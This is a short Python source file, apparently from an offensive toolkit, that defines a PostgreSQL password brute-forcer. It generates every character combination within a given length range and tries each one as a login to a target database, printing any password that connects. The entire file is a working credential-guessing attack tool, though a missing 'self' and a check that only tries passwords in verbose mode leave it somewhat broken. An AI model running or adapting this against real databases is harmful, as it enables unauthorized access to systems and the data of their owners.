import psycopg2
import itertools
from brainiac_libs.brainiac_debug.debug import Debug
class Postgresql_brute:
    def __init__(self,dbname,user,host,password):
        self.dbname=dbname
        self.user=user
        self.host=host
        self.password=password
    def postgresql_brute(dbname,user,host,minimo,maximo,char,verbose=""):
        min = minimo
        max = maximo
        chrs = char
        min_length, max_length = int(min), int(max)
        for n in range(min_length, max_length + 1):
            for xs in itertools.product(chrs, repeat=n):
                if verbose == True:
                    passw = ''.join(xs)
                    try:
                        conn = psycopg2.connect(dbname=dbname, user=user, host=host, password=passw)
                        print(passw)
                    except psycopg2.OperationalError as e:
                        Debug.ERRO("database => db[%s] pass[%s]"%(dbname,passw))


